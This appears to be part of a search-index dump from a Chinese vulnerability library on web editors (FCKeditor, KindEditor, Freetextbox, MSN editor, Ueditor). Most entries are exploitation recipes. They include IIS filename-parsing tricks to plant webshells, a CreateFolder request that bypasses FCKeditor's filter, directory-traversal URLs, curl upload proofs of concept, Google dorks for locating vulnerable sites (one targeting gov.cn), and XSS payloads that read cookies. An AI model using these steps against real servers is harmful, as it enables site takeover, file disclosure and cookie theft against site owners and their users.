<p>1.\u67e5\u770b\u7f16\u8f91\u5668\u7248\u672c</p> <p>FCKeditor/_whatsnew.html</p> <p></p> <p>2.FCKeditor\u7f16\u8f91\u5668\u9875 </p> <p>FCKeditor/_samples/default.html</p> <p></p> <p>3.\u5e38\u7528\u4e0a\u4f20\u5730\u5740</p> <pre><code>FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp\n\n\n\nFCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/\n\n\n\nFCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp\n\n\n\nFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../connectors/asp/connector.asp\n</code></pre> <p>\u7531\u4e8e\u8fd9\u91cc\u7528\u7684\u662f2.5\u7684\u7248\u672c\u6240\u4ee5\u4e0b\u9762\u8fd9\u6761\u8bed\u53e5\u80fd\u7528</p> <pre><code>http://192.168.87.129:8234//editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../connectors/asp/connector.asp\n</code></pre> <p></p> <p>\u5982\u679c\u5728\u8f93\u5165\u4ee5\u4e0a\u5730\u5740\u6d4b\u8bd5\u7684\u8fc7\u7a0b\u4e2d\u5f39\u51fa\u4ee5\u4e0b\u7684\u63d0\u793a</p> <p></p> <p>\u90a3\u5c31\u662f\u6ca1\u6709\u5f00\u542f\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd,\u8981\u628a\\editor\\filemanager\\connectors\\asp\\config.asp\u6587\u4ef6\u4e2d\u7684</p> <p>Dim ConfigIsEnabled  ConfigIsEnabled = False</p> <p>\u8bbe\u7f6e\u6210\u529ftrue\u3002\u5c31\u884c\u4e86\uff0c\u7136\u540e\u4e0a\u4f206.asp;.jpg\u6587\u4ef6\u8bd5\u8bd5</p> <p></p> <p>\u53d1\u73b0\u4ed6\u8fdb\u884c\u4e86\u8fc7\u6ee46.asp;.jpg\u6539\u6210\u4e866_asp;.jpg,\u628a\u70b9\u6539\u6210\u4e86\u4e0b\u5212\u7ebf\u3002\u5ba1\u67e5\u5143\u7d20\u770b\u4e0b\u56fe\u7247\u7684\u8def\u5f84</p> <p></p> <p>\u8bbf\u95ee\u8fd9\u4e2a\u8def\u5f84\u770b\u4e0b\u3002</p> <p></p> <p>asp\u6587\u4ef6\u5e76\u6ca1\u6709\u88ab\u89e3\u6790\u6210\u529f\u3002</p> <p>\u8fd9\u5c31\u662ffckeditor\u8fc7\u6ee4\".\"\u4e3a\"_\"\u7684\u4e00\u4e2a\u673a\u5236,\u60f3\u8981\u7a81\u7834\u7684\u8bdd\u6709\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\uff1a</p> <p>1.\u4e8c\u6b21\u4e0a\u4f20</p> <p>\u7b2c\u4e00\u6b21\u4e0a\u4f20\uff1aqq.asp;.jpg ==\u300bqq_asp;.jpg</p> <p>\u7b2c\u4e8c\u6b21\u4e0a\u4f20\uff1aqq.asp;.jpg ==\u300bqq_asp;.jpg (\u4e0d\u6ee1\u8db3\u547d\u540d\u8981\u6c42)</p> <p>\u53ef\u80fd\u51fa\u73b0\u7b2c\u4e8c\u6b21\u547d\u540d\u4e3a qq.asp;.(1).jpg</p> <p></p> <p>\u8fd8\u662f\u88ab\u8fc7\u6ee4\u4e86\u3002\u3002</p> <p>2.\u65b0\u5efa\u4e0a\u4f20</p> <p>\u624b\u52a8\u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939</p> <p></p> <p>\u53d1\u73b0\u4ed6\u8fd8\u662f\u8fc7\u6ee4\u4e86\u3002\u90a3\u6211\u4eec\u53ea\u6709\u7a81\u7834\u5efa\u7acb\u6587\u4ef6\u5939\u4e86\u3002</p> <p>\u6267\u884c\u4ee5\u4e0b\u5730\u5740\u5c31\u80fd\u6210\u529f\u521b\u5efa\u6587\u4ef6\u5939</p> <pre><code>/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/fendo.asp&amp;NewFolderName=x.asp\n</code></pre> <p></p> <p></p> <p>\u8fd9\u53c8\u662f\u4e3a\u4ec0\u4e48\u4e86????\u624b\u52a8\u4e0d\u80fd\u521b\u5efa\uff0c\u800c\u901a\u8fc7\u4ee5\u4e0a\u5730\u5740\u5c31\u80fd\u6210\u529f\u521b\u5efa\u4e86\uff0c\u8ba9\u6211\u4eec\u6765\u5bf9\u6bd4\u4e0b\uff0c\u624b\u52a8\u521b\u5efa\u548c\u901a\u8fc7\u4ee5\u4e0a\u5730\u5740\u521b\u5efa\u7684\u4e00\u4e2a\u533a\u522b\u3002</p> <p>\u6f0f\u6d1e\u5730\u5740\uff1a</p> <p>/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/fendo.asp&amp;NewFolderName=x.asp</p> <p>\u624b\u5de5\u65b0\u5efa\uff1a</p> <p>/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/&amp;NewFolderName=fendo.asp</p> <p>\u539f\u56e0\uff1a</p> <p>CurrentFolder\uff1a\u5f53\u524d\u6587\u4ef6\u5939 \u672a\u8fdb\u884c\u8fc7\u6ee4(\u8fd9\u4e2a\u6587\u4ef6\u5939\u4e0b\u7684\u6ca1\u6709\u8fc7\u6ee4)</p> <p>NewFolderName\uff1a\u65b0\u5efa\u6587\u4ef6\u540d \u8fdb\u884c\u4e86\u8fc7\u6ee4</p> <p>\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u901a\u8fc7\u4e0a\u9762\u5730\u5740\u80fd\u521b\u5efa\uff0c\u800c\u624b\u52a8\u5374\u4e0d\u80fd\u521b\u5efa\u7684\u4e00\u4e2a\u539f\u56e0\uff0c\u7136\u540e\u6211\u4eec\u518d\u4e0a\u4f206.asp;.jpg\u5230fendo.asp\u6587\u4ef6\u4e0b\u770b\u662f\u5426\u6210\u529f\u89e3\u6790\u3002</p> <p></p> <p>\u6210\u529f\u89e3\u6790\u3002\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Freetextbox%20editor/Freetextbox%20Asp.net%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/","title":"Freetextbox Asp.net\u89e3\u6790\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Freetextbox%20editor/Freetextbox%20Asp.net%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#freetextbox","title":"Freetextbox","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Freetextbox%20editor/Freetextbox%20Asp.net%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#freetextbox_1","title":"Freetextbox\u904d\u5386\u76ee\u5f55\u6f0f\u6d1e","text":"<p>\u5f71\u54cd\u7248\u672c\uff1a\u672a\u77e5 \u8106\u5f31\u63cf\u8ff0\uff1a \u56e0\u4e3aftb.imagegallery.aspx\u4ee3\u7801\u4e2d \u53ea\u8fc7\u6ee4\u4e86/\u4f46\u662f\u6ca1\u6709\u8fc7\u6ee4\\\u7b26\u53f7\u6240\u4ee5\u5bfc\u81f4\u51fa\u73b0\u4e86\u904d\u5386\u76ee\u5f55\u7684\u95ee\u9898\u3002 \u653b\u51fb\u5229\u7528: \u5728\u7f16\u8f91\u5668\u9875\u9762\u70b9\u56fe\u7247\u4f1a\u5f39\u51fa\u4e00\u4e2a\u6846\uff08\u6293\u5305\u5f97\u5230\u6b64\u5730\u5740\uff09\u6784\u9020\u5982\u4e0b\uff0c\u53ef\u904d\u5386\u76ee\u5f55\u3002 http://navisec.it/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&amp;rif=..&amp;cif=..</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Freetextbox%20editor/Freetextbox%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/","title":"Freetextbox\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Freetextbox%20editor/Freetextbox%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#freetextbox","title":"Freetextbox","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Freetextbox%20editor/Freetextbox%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#freetextbox_1","title":"Freetextbox\u904d\u5386\u76ee\u5f55\u6f0f\u6d1e","text":"<p>\u5f71\u54cd\u7248\u672c\uff1a\u672a\u77e5 \u8106\u5f31\u63cf\u8ff0\uff1a \u56e0\u4e3aftb.imagegallery.aspx\u4ee3\u7801\u4e2d \u53ea\u8fc7\u6ee4\u4e86/\u4f46\u662f\u6ca1\u6709\u8fc7\u6ee4\\\u7b26\u53f7\u6240\u4ee5\u5bfc\u81f4\u51fa\u73b0\u4e86\u904d\u5386\u76ee\u5f55\u7684\u95ee\u9898\u3002 \u653b\u51fb\u5229\u7528: \u5728\u7f16\u8f91\u5668\u9875\u9762\u70b9\u56fe\u7247\u4f1a\u5f39\u51fa\u4e00\u4e2a\u6846\uff08\u6293\u5305\u5f97\u5230\u6b64\u5730\u5740\uff09\u6784\u9020\u5982\u4e0b\uff0c\u53ef\u904d\u5386\u76ee\u5f55\u3002 http://127.0.0.1/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&amp;rif=..&amp;cif=..</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/KindEditor%203.4.2%263.5.5%E5%88%97%E7%9B%AE%E5%BD%95%E6%BC%8F%E6%B4%9E/","title":"KindEditor 3.4.2&3.5.5\u5217\u76ee\u5f55\u6f0f\u6d1e","text":"<p>**KindEditor\u5217\u76ee\u5f55\u6f0f\u6d1e **</p> <p>\u6d4b\u8bd5\u7248\u672c\uff1aKindEditor 3.4.2  KindEditor 3.5.5 </p> <p>1.1.http://127.0.0.1/67cms/kindeditor/php/file_manager_json.php?path=/  \\2. //path=/\uff0c\u7206\u51fa\u7edd\u5bf9\u8def\u5f84D:AppServwww67cmskindeditorphpfile_manager_json.php  \\3. 2.http://127.0.0.1/67cms/kindeditor/php/file_manager_json.php?path=AppServ/www/67cms/  \\4. //\u6839\u636e\u7206\u51fa\u7684\u7edd\u5bf9\u8def\u5f84\uff0c\u4fee\u6539path\u7684\u503c\u4e3aAppServ/www/67cms/  \\5. \u8fd9\u65f6\u5c06\u904d\u5386d:/AppServ/www/67cms/\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u548c\u6587\u4ef6\u540d </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%203.2.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"Kindeditor 3.2.1\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%203.2.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#kindeditor","title":"Kindeditor","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%203.2.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#win-2003-iisshell","title":"\u5229\u7528WIN 2003 IIS\u6587\u4ef6\u540d\u79f0\u89e3\u6790\u6f0f\u6d1e\u83b7\u5f97SHELL","text":"<p>\u5f71\u54cd\u7248\u672c: &lt;= kindeditor  3.2.1(09\u5e748\u6708\u4efd\u53d1\u5e03\u7684\u6700\u65b0\u7248) \u8106\u5f31\u63cf\u8ff0/\u653b\u51fb\u5229\u7528\uff1a test.asp;.jpg</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%203.5.2-4.1%E4%B8%8A%E4%BC%A0%E4%BF%AE%E6%94%B9%E6%8B%BFshell/","title":"Kindeditor 3.5.2 4.1\u4e0a\u4f20\u4fee\u6539\u62ffshell","text":"<p>**\u4e0a\u4f20\u4fee\u6539\u62ffshell\u6f0f\u6d1e </p> <p>**\u5f71\u54cd\u7248\u672c\uff1a KindEditor 3.5.2~4.1</p> <p>\u6f0f\u6d1e\u5229\u7528\uff1a \u6253\u5f00\u7f16\u8f91\u5668\uff0c\u5c06\u4e00\u53e5\u8bdd\u6539\u540d\u4e3a1.jpg  \u4e0a\u4f20\u56fe\u7247\uff0c \u6253\u5f00\u6587\u4ef6\u7ba1\u7406\uff0c\u8fdb\u5165\u201cdown\u201d\u76ee\u5f55\uff0c\u8df3\u81f3\u5c3e\u9875\uff0c\u6700\u540e\u4e00\u4e2a\u56fe\u7247\u65e2\u662f\u6211\u4eec\u4e0a\u4f20\u7684\u4e00\u53e5\u8bdd \u70b9\u51fb\u6539\u540d</p> <p></p> <p>\u6253\u5f00\u8c37\u6b4c\u6d4f\u89c8\u5668\u7684 \u5ba1\u67e5\u5143\u7d20</p> <p></p> <p>\u627e\u5230form\u8868\u5355 </p> <p></p> <p>\u4fee\u6539\u201cjpg\u201d\u4e3a\u201casp\u201d  </p> <p>\u540d\u5b57\u4fee\u6539\u4e3a1 \u4fdd\u5b58</p> <p></p> <p>\u4e00\u53e5\u8bdd\u5c31\u751f\u6210\u4e86\uff0c\u8fde\u63a5\u5730\u5740\u4e3a</p> <p>http://www.*.com /upfiles/down/1.asp</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%204.1.11%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"kindeditor\u4e0a\u4f20\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%204.1.11%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>kindeditor &lt;= 4.1.11</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%204.1.11%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<p><pre><code>curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/php/upload_json.php?dir=file\ncurl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/asp/upload_json.asp?dir=file\ncurl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/jsp/upload_json.jsp?dir=file\ncurl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/aspx/upload_json.aspx?dir=file \n\u200b```\u8fd4\u56de\u503c\u4e3a\u8def\u5f84 \n</code></pre> </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%204.1.5%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"kindeditor&lt;=4.1.5\u4e0a\u4f20\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%204.1.5%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#0x00","title":"0x00 \u6f0f\u6d1e\u63cf\u8ff0","text":"<p>\u6f0f\u6d1e\u5b58\u5728\u4e8ekindeditor\u7f16\u8f91\u5668\u91cc\uff0c\u4f60\u80fd\u4e0a\u4f20.txt\u548c.html\u6587\u4ef6\uff0c\u652f\u6301php/asp/jsp/asp.net,\u6f0f\u6d1e\u5b58\u5728\u4e8e\u5c0f\u4e8e\u7b49\u4e8ekindeditor4.1.5\u7f16\u8f91\u5668\u4e2d</p> <p>\u8fd9\u91cchtml\u91cc\u9762\u53ef\u4ee5\u5d4c\u5957\u6697\u94fe\u63a5\u5730\u5740\u4ee5\u53ca\u5d4c\u5957xss\u3002Kindeditor\u4e0a\u7684uploadbutton.html\u7528\u4e8e\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u9875\u9762\uff0c\u76f4\u63a5POST\u5230/upload_json.*?dir=file\uff0c\u5728\u5141\u8bb8\u4e0a\u4f20\u7684\u6587\u4ef6\u6269\u5c55\u540d\u4e2d\u5305\u542bhtm,txt\uff1aextTable.Add(\"file\",\"doc,docx,xls,xlsx,ppt,htm,html,txt,zip,rar,gz,bz2\")</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%204.1.5%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#0x01","title":"0x01 \u6279\u91cf\u641c\u7d22","text":"<p>\u5728google\u4e2d\u6279\u91cf\u641c\u7d22\uff1a</p> <p></p> <pre><code>inurl:/examples/uploadbutton.html\n\ninurl:/php/upload_json.php\n\ninurl:/asp.net/upload_json.ashx\n\ninurl://jsp/upload_json.jsp\n\ninurl://asp/upload_json.asp\n\ninurl:gov.cn/kindeditor/\n</code></pre> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%204.1.5%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#0x02","title":"0x02 \u6f0f\u6d1e\u95ee\u9898","text":"<p>\u6839\u672c\u811a\u672c\u8bed\u8a00\u81ea\u5b9a\u4e49\u4e0d\u540c\u7684\u4e0a\u4f20\u5730\u5740\uff0c\u4e0a\u4f20\u4e4b\u524d\u6709\u5fc5\u8981\u9a8c\u8bc1\u6587\u4ef6 upload_json.* \u7684\u5b58\u5728</p> <p></p> <pre><code>/asp/upload_json.asp\n\n/asp.net/upload_json.ashx\n\n/jsp/upload_json.jsp\n\n/php/upload_json.php\n</code></pre> <p></p> <p>\u53ef\u76ee\u5f55\u53d8\u91cf\u67e5\u770b\u662f\u5426\u5b58\u5728\u90a3\u79cd\u811a\u672c\u4e0a\u4f20\u6f0f\u6d1e:</p> <p></p> <pre><code>kindeditor/asp/upload_json.asp?dir=file\n\nkindeditor/asp.net/upload_json.ashx?dir=file\n\nkindeditor/jsp/upload_json.jsp?dir=file\n\nkindeditor/php/upload_json.php?dir=file\n</code></pre> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%204.1.5%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#0x03","title":"0x03 \u6f0f\u6d1e\u5229\u7528","text":"<p>google\u641c\u7d20\u4e00\u4e9b\u5b58\u5728\u7684\u7ad9\u70b9 inurl\uff1akindeditor</p> <p>1.\u67e5\u770b\u7248\u672c\u4fe1\u606f</p> <p>http://www.xxx.org/kindeditor//kindeditor.js</p> <p></p> <p>2.\u7248\u672c\u662f4.1.10\u53ef\u4ee5\u8fdb\u884c\u5c1d\u8bd5\u5982\u4e0b\u8def\u5f84\u662f\u5426\u5b58\u5728\u6709\u5fc5\u8981\u9a8c\u8bc1\u6587\u4ef6 upload_json.* </p> <p></p> <pre><code>kindeditor/asp/upload_json.asp?dir=file\n\nkindeditor/asp.net/upload_json.ashx?dir=file\n\nkindeditor/jsp/upload_json.jsp?dir=file\n\nkindeditor/php/upload_json.php?dir=file\n</code></pre> <p></p> <p>3.\u5982\u4e0b\u56fe\u53ef\u4ee5\u770b\u51fa\u662f\u5b58\u5728jsp\u4e0a\u4f20\u70b9:</p> <p>http://www.xxx.org/kindeditor/jsp/upload_json.jsp?dir=file</p> <p></p> <p>4.\u5199\u51fa\u4e0b\u9762\u7684\u6784\u9020\u4e0a\u4f20poc,\u8fd9\u91cc\u9700\u8981\u4fee\u6539"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0/","title":"Kindeditor \u89e3\u6790\u6f0f\u6d1e\u4e0a\u4f20","text":"<p>**KindEditor\u4e0a\u4f20\u89e3\u6790\u6f0f\u6d1e </p> <p>**\u5f71\u54cd\u7248\u672c\uff1a&lt;= kindeditor 3.2.1(09\u5e748\u6708\u4efd\u53d1\u5e03\u7684\u6700\u65b0\u7248) </p> <p>\u6f0f\u6d1e\u5229\u7528\uff1a\u5229\u7528windows 2003 IIS\u89e3\u6790\u6f0f\u6d1e\u62ffWEBSHELL </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/MSNeditor/MSN%E7%BC%96%E8%BE%91%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"MSN\u7f16\u8f91\u5668\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/MSNeditor/MSN%E7%BC%96%E8%BE%91%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#msn-editor","title":"Msn editor","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/MSNeditor/MSN%E7%BC%96%E8%BE%91%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#win-2003-iisshell","title":"\u5229\u7528WIN 2003 IIS\u6587\u4ef6\u540d\u79f0\u89e3\u6790\u6f0f\u6d1e\u83b7\u5f97SHELL","text":"<p>\u5f71\u54cd\u7248\u672c\uff1a\u672a\u77e5 \u8106\u5f31\u63cf\u8ff0\uff1a \u70b9\u51fb\u56fe\u7247\u4e0a\u4f20\u540e\u4f1a\u51fa\u73b0\u4e0a\u4f20\u9875\u9762\uff0c\u5730\u5740\u4e3a http://navisec.it/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum= \u7528\u666e\u901a\u7684\u56fe\u7247\u4e0a\u4f20\u540e\uff0c\u5730\u5740\u4e3a http://navisec.it/news/uppic/41513102009204012_1.gif \u8bb0\u4f4f\u8fd9\u65f6\u5019\u7684\u8def\u5f84\uff0c\u518d\u70b9\u51fb\u56fe\u7247\u7684\u4e0a\u4f20\uff0c\u8fd9\u65f6\u5019\u5730\u5740\u5c31\u53d8\u6210\u4e86 http://navisec.it/news/admin/uploadPic.asp?language=&amp;editImageNum=1&amp;editRemNum=41513102009204012 \u5f88\u660e\u663e\u3002\u56fe\u7247\u7684\u5730\u5740\u662f\u6839\u636eRemNum\u540e\u9762\u7684\u7f16\u53f7\u751f\u6210\u7684\u3002 \u653b\u51fb\u5229\u7528: \u914d\u5408IIS\u7684\u89e3\u6790\u6f0f\u6d1e\uff0c\u628aRemNum\u540e\u9762\u7684\u6570\u636e\u4fee\u6539\u4e3a1.asp;41513102009204012\uff0c\u53d8\u6210\u4e0b\u9762\u8fd9\u4e2a\u5730\u5740 http://navisec.it/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=1.asp;41513102009204012 \u7136\u540e\u5728\u6d4f\u89c8\u5668\u91cc\u6253\u5f00\uff0c\u7136\u540e\u9009\u62e9\u4f60\u7684\u811a\u672c\u6728\u9a6c\u4e0a\u4f20\uff0c\u5c06\u4f1a\u8fd4\u56de\u4e0b\u9762\u7684\u5730\u5740 uppic/1.asp;41513102009204012_2.gif \u76f4\u63a5\u6253\u5f00\u5c31\u662f\u6211\u4eec\u7684\u5c0f\u9a6c\u5730\u5740\uff01</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%20%E5%8F%8D%E5%B0%84xss%E6%BC%8F%E6%B4%9E/","title":"Ueditor \u53cd\u5c04\u578bxss\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%20%E5%8F%8D%E5%B0%84xss%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u5730\u5740\uff1a","text":"<p>/php/getContent.php  /asp/getContent.asp  /jsp/getContent.jsp  /net/getContent.ashx</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%20%E5%8F%8D%E5%B0%84xss%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<p>POST:</p> <pre><code>myEditor=&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%20%E5%AD%98%E5%82%A8xss%E6%BC%8F%E6%B4%9E/","title":"Ueditor xss\u5b58\u50a8\u6f0f\u6d1e","text":"<p>\u76f4\u63a5\u6587\u672c\u6846\u8f93\u5165</p> <p>\u6f0f\u6d1ePOC:</p> <pre><code>&lt;html&gt;\n&lt;head&gt;&lt;/head&gt;\n&lt;body&gt;\n&lt;something:script xmlns:something=\"http://www.w3.org/1999/xhtml\"&gt;alert(1)&lt;/something:script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n\n\u76f2\u6253Cookie\u3001src=\"\"\uff1a\n&lt;something:script src=\"\" xmlns:something=\"http://www.w3.org/1999/xhtml\"&gt;&lt;/something:script&gt;\n</code></pre> <p>Ueditor \u9ed8\u8ba4\u652f\u6301\u4e0a\u4f20 xml \uff1aconfig.json\u53ef\u4ee5\u67e5\u770b\u652f\u6301\u4e0a\u4f20\u7684\u540e\u7f00</p> <p>/ueditor/asp/config.json  /ueditor/net/config.json  /ueditor/php/config.json  /ueditor/jsp/config.json</p> <p>\u4e0a\u4f20\u6587\u4ef6\u8def\u5f84</p> <p>/ueditor/index.html</p> <p>/ueditor/asp/controller.asp?action=uploadimage  /ueditor/asp/controller.asp?action=uploadfile</p> <p>/ueditor/net/controller.ashx?action=uploadimage  /ueditor/net/controller.ashx?action=uploadfile</p> <p>/ueditor/php/controller.php?action=uploadfile  /ueditor/php/controller.php?action=uploadimage</p> <p>/ueditor/jsp/controller.jsp?action=uploadfile  